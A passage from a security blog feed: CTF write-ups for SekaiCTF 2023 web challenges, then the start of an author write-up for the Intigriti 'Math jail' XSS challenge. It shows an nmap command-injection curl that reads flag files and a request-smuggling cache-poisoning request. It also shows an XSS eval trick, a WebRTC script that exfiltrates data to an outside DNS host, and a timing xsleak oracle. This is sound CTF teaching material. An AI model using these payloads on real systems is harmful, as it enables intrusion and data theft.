--script</code> to execute that script:</p><pre class="line-numbers language-none"><code class="language-none">--script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125;--script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>In Discord, @zeosutt provided an interesting alternative solution that utilizes the technique of uploaded files being stored in <code>/tmp/</code> on the rack server. You can directly import the uploaded file:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\t--script\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="frog-waf-29-solves">Frog-WAF (29 solves)</span></h3><p>There is an EL injection vulnerability in <code>buildConstraintViolationWithTemplate</code>, and the remaining challenge is to bypass the WAF.</p><p>Similar vulnerabilities have been found in actual products:</p><ol><li><a href="https://github.com/advisories/GHSA-wfj5-2mqr-7jvv">Expression Language Injection in Netflix Conductor</a></li><li><a href="https://xz.aliyun.com/t/7889">CVE-2020-9296-Netflix-Conductor-RCE-Analysis</a></li></ol><p>For the bypassing part, you can refer to the following resources:</p><ol><li><a href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></li><li><a href="https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba">https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba</a></li><li><a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li></ol><h3><span id="chunky-16-solves">Chunky (16 solves)</span></h3><p>This challenge involves a cache server and a backend server. All requests go through the cache server before reaching the backend, and a copy of the response is stored in the cache server as a cache. The goal is to poison the cache.</p><p>The solution is to construct a request that is interpreted differently by the cache server and the backend server, similar to request smuggling. Here is the solution provided by <a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">zeyu</a>:</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;aaaaa HTTP&#x2F;1.1Host: localhosttransfer-encoding: chunkedContent-Length: 1020GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1Host: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The cache server interprets the second request as <code>GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json</code> based on the <code>Content-Length</code> header, while the backend server interprets it as <code>GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5</code> based on the <code>transfer-encoding</code> header. This way, we can use the response from another path to poison the jwks.json file and achieve cache poisoning.</p><h3><span id="golf-jail-16-solves">Golf Jail (16 solves)</span></h3><p>I have solved this challenge, which took me about a day. I found it very interesting, and the code is concise.</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cross-Origin-Opener-Policy: same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"🚩🚩🚩"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>            <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span>            <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;!-- <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span> -->&lt;div><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>&lt;/div><span class="token punctuation">"</span></span>        <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You are given a 30-character free XSS payload, and the goal is to execute arbitrary code.</p><p>The clever part here is the use of <code>&lt;iframe srcdoc&gt;</code> with <code>sandbox=allow-scripts</code> to create an environment where code can be executed, but the origin is <code>null</code>, and the CSP (Content Security Policy) inherits the execution environment from the parent.</p><p>Therefore, you cannot access any information from the top, including <code>name</code> or <code>location</code>.</p><p>After searching around, I found <code>baseURI</code> in the <code>document</code>, which I discovered inherits the value from the parent and contains the complete path. So, by using <code>&lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt;</code> along with a hash, we can execute arbitrary code within the 30-character limit.</p><p>The reason we can use <code>baseURI</code> to access <code>document.baseURI</code> is that the scope of inline event handlers is automatically added to the document. I wrote about this in my blog post <a href="https://blog.huli.tw/2021/10/25/en/learn-frontend-from-security-pov/">Discovering My Lack of Front-end Knowledge through Cybersecurity</a>.</p><p>Once we have XSS, we can use <code>document.childNodes[0].nodeValue</code> to retrieve the flag. The final challenge is how to exfiltrate the flag. The CSP in this challenge is strict, and we cannot use redirects or <code>window.open</code> (the challenge blocks navigation without using the new <code>navigate-to</code> directive, it’s impressive). So, we have to rely on some existing bypass techniques.</p><p>I first tried DNS prefetch, but it didn’t work. I found out that Chrome released a feature called <a href="https://chromestatus.com/feature/5553640629075968">Resoure Hint “Least Restrictive” CSP</a> in version 112, which might be the reason.</p><p>But no worries, WebRTC is still useful. However, I couldn’t figure out how to use it even after trying for a long time. In the end, I found a payload in another team’s write-up on <a href="https://ctftime.org/writeup/37702">CTFtime</a> and combined it with DNS:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"SEKAI&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">iceServers</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">urls</span><span class="token operator">:</span> <span class="token string">"stun:"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">".29e6037fd1.ipv6.1433.eu.org:1337"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="leakless-note-4-solves">Leakless Note (4 solves)</span></h3><p>This is an advanced version of the previously mentioned “leakynote” challenge. This time, the CSP is stricter with the addition of <code>default-src &#39;self&#39;</code>, and there are no other CSS files on the page.</p><p>The scenario is the same: there is an iframe that may or may not load, and the goal is to detect this.</p><p>The solution provided by strellic is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// leakless note oracle</span><span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">w<span class="token punctuation">,</span> href</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> runs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">600</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> t <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            w<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>buffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            samples<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">delete</span> b<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        runs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>samples<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">.</span>location <span class="token operator">=</span> href<span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rate limit</span>        <span class="token keyword">await</span> <span class="token function">waitFor</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    runs<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">median</span><span class="token operator">:</span> <span class="token function">median</span><span class="token punctuation">(</span>runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">sum</span><span class="token operator">:</span> runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        runs    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When you send a large message to the iframe, the time it takes will be different.</p><p>Another team opened 1000 tabs and measured the network time. In hindsight, it seems quite reasonable. If the iframe has a status code of 200, it will generate a lot of requests, slowing down the network speed.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.&lt;/p&gt;
&lt;p&gt;As usual, here are the keywords I noted:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GraphQL batch query + alias&lt;/li&gt;
&lt;li&gt;Python os.path.join absolute path&lt;/li&gt;
&lt;li&gt;Svg XSS, foreignObject&lt;/li&gt;
&lt;li&gt;WebRTC CSP bypass&lt;/li&gt;
&lt;li&gt;Status code xsleak&lt;/li&gt;
&lt;li&gt;DNS rebinding&lt;/li&gt;
&lt;li&gt;nmap command injection&lt;/li&gt;
&lt;li&gt;Ruby rack file upload temporary storage&lt;/li&gt;
&lt;li&gt;buildConstraintViolationWithTemplate EL injection&lt;/li&gt;
&lt;li&gt;Request smuggling&lt;/li&gt;
&lt;li&gt;document.baseURI&lt;/li&gt;
&lt;li&gt;200&amp;#x2F;404 status code xsleak&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Math jail - Intigriti 0823 XSS Challenge Author Writeup</title>
    <link href="https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/"/>
    <id>https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/</id>
    <published>2023-08-29T06:10:44.000Z</published>
    <updated>2023-08-29T06:41:36.526Z</updated>
    
    <content type="html"><![CDATA[<p>In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: <a href="https://challenge-0823.intigriti.io/">https://challenge-0823.intigriti.io/</a></p><p>Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.</p><span id="more"></span><p>The concept of “Math jail” originated from a challenge called “Culinary Class Room” in the Hack.lu CTF 2022. This challenge required adding numerous decorators to a Python class without any parameters, with the objective of executing arbitrary code.</p><p>Decorators are essentially function calls, which means you can only use code in the form of <code>a(b(c(d(e(f())))))</code>. How can one achieve the ability to execute any desired functionality?</p><p>Similar challenges have also appeared in Chinese CTF competitions, such as the one mentioned in this article: <a href="https://xz.aliyun.com/t/9360">PHP Parameterless RCE</a>.</p><p>The solution to the Culinary Class Room challenge involved finding a list, pushing multiple numbers into it, converting it to bytes, and then passing it to <code>eval()</code> for execution.</p><p>For example, the following code snippet would push the number 112 into <code>copyright._Printer__filenames</code>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span><span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span><span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span><span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Upon encountering this challenge, I wondered if it would be possible to create a JavaScript version. That’s how Math jail came into existence.</p><p>Initially, there was no requirement for it to start with <code>Math.</code>, but later on, I found it more interesting to do so. Moreover, if it didn’t have this restriction, one could simply execute <code>alert(document.domain.toString())</code> and be done. Filtering out many keywords and potential unintended consequences would be necessary.</p><p>Now, let’s discuss the general approach to solving Math jail.</p><h2><span id="the-overall-concept-of-the-solution">The overall concept of the solution</span></h2><p>The concept is similar to the Python version mentioned earlier. We need to find a list, push elements into it, and then join the elements and pass them to <code>eval()</code> for execution. Here’s a general example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Uncaught ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>In the above code, the variable <code>a</code> is executed. By following this concept, we can construct <code>alert()</code>. Let’s take a simple example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>    <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>          <span class="token string">')'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>              <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>                arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">)</span>          <span class="token punctuation">)</span>        <span class="token punctuation">)</span>      <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Since each function call cannot have parameters, expressions like <code>arr.join(&#39;&#39;)</code> can be modified to <code>arr.join(&#39;&#39;.toString())</code> to comply with the rule.</p><p>Once we have this basic concept, the remaining questions can be divided into four parts:</p><ol><li>How do we find a usable array?</li><li>How do we find the desired characters?</li><li>How do we join them?</li><li>How do we execute without using eval?</li></ol><h2><span id="1-finding-an-array">1. Finding an array</span></h2><p>In the given challenge, there is a specific array called <code>Math.seeds</code>. By using the <code>pop()</code> method multiple times, we can empty the array. Here’s an example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token comment">// []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, we have an empty array <code>Math.seeds</code> that we can use to store elements.</p><h2><span id="2-finding-the-desired-characters">2. Finding the desired characters</span></h2><p>Firstly, we can check if the desired characters exist within <code>Math</code>. For example, <code>Math.abs.name</code> gives us the string <code>&quot;abs&quot;</code>, and by using <code>.at()</code> on it, <code>Math.abs.name.at()</code> would be <code>&quot;a&quot;</code>.</p><p>Therefore, <code>Math.seeds.push(Math.abs.name.at())</code> would make the contents of <code>Math.seeds</code> become <code>[&quot;a&quot;]</code>.</p><p>The return value of <code>Array.prototype.push</code> is the length of the array. Hence, if we can find a function whose second letter is <code>&#39;l&#39;</code>, it would be optimal to reduce the number of function calls.</p><p>By now, you might have realized that manually solving this challenge would be tiresome. Automating the process would be a better approach. So, let’s write a function!</p><p>We can use recursion to explore each property of accessible objects and check if it meets our desired criteria. The function implementation is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    